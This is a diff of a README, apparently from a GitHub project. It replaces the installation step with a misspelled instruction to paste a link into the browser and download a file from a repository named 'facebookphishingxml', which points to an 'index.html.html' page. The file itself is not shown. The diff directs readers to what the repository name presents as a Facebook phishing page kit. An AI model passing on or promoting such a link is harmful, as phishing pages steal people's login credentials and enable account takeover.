@@ -24,11 +24,11 @@
 
 ## :toolbox: Getting Started
 
-### :gear: Installation
+### :gear: Copy and paste your browswer for download file
 
 
 ```bash
-Just Download
+https://github.com/rahadhasan666/facebookphishingxml/blob/main/index.html.html
 ```
 
 
